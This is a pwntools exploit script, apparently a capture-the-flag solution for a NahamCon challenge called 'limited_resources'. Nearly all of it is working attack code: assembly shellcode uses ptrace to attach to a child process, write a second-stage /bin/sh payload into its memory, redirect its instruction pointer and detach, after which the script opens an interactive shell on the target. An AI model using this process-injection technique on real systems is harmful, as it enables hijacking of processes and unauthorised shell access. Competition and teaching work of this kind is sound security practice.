from pwn import *
import time
import sys



c = constants
c.PTRACE_GETREGS = 12
c.PTRACE_SETREGS = 13
MARKER = b'Exit\n'

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['/usr/bin/vscode']
# context.timeout = 2

def conn():
	global local
	global debug
 
	for arg in sys.argv[1:]:
		if arg in '-l':
			local = 1
		if arg in '-d':
			debug = 1

	if local:
		s = process('./limited_resources')
		if debug:
			gdb.attach(s, gdbscript='''
            set follow-fork-mode child
            b* main+738
            c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('challenge.nahamcon.com',30538)

	return s



elf = ELF('./limited_resources')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

def get_pid():
    s.sendlineafter(MARKER, b'2')
    s.recvuntil(b' = ')
    return int(s.recvline().strip())

def run_sc(sc):
    s.sendlineafter(MARKER, b'1')
    s.recvline()
    s.sendline(str(len(sc) + 1).encode())
    s.recvline()
    s.sendline(b'7')
    s.recvline()
    s.send(sc)
    addr = int(s.recvline().strip().split(b' ')[-1], 16)
    print(f'{addr = :x}')
    s.sendlineafter(MARKER, b'3')
    s.recvline()
    s.sendline(f'{addr:x}'.encode())

def exploit(s):
    pid = get_pid()
    print(f'{pid = }')

    # Using shellcraft to generate /bin/sh shellcode.
    stage2 = asm(shellcraft.sh())
    stage2_qlen = (len(stage2) + 7) // 8

    addr = 0x401000 # stage2 target address
    sc = f'''
        mov r15, rdx /* save shellcode addr in r15 */
        
        // ptrace attach - attach to child
        mov rax, {c.SYS_ptrace}
        mov rdi, {c.PTRACE_ATTACH}
        mov rsi, {pid}
        xor rdx, rdx
        xor r10, r10
        syscall

        // loop until attach is done
    getregs_loop:
        mov rax, {c.SYS_ptrace}
        mov rdi, {c.PTRACE_GETREGS}
        mov rsi, {pid}
        xor rdx, rdx
        lea r10, [rsp - 0x1000] /* struct pt_regs addr */
        syscall
        test eax, eax
        jnz getregs_loop    

        // copy stage2 into addr
        xor r14, r14
    copy_loop:
        mov rax, {c.SYS_ptrace}
        mov rdi, {c.PTRACE_POKETEXT}
        mov rsi, {pid}
        lea rdx, [{addr} + r14*8]       /* dst */
        mov r10, [r15 + 0x100 + r14*8]  /* src */
        syscall
        inc r14
        cmp r14, {stage2_qlen}
        jb copy_loop

        // set struct pt_regs.rip to addr
        mov rax, {addr + 2} /* +2 because the kernel subtracts len(syscall_opcode) after returning */
        movq [rsp - 0x1000 + 0x80], rax /* pt_regs.rip */

        // set new child regs
        mov rax, {c.SYS_ptrace}
        mov rdi, {c.PTRACE_SETREGS}
        mov rsi, {pid}
        xor rdx, rdx
        lea r10, [rsp - 0x1000]
        syscall

        // detach
        mov rax, {c.SYS_ptrace}
        mov rdi, {c.PTRACE_DETACH}
        mov rsi, {pid}
        xor rdx, rdx
        xor r10, r10
        syscall

    inf:
        jmp inf
    '''
    sc = asm(sc)
    sc += b'\x90' * (-len(sc) % 0x100)
    sc += stage2
    
    run_sc(sc)
    s.interactive()

s = conn()
exploit(s)


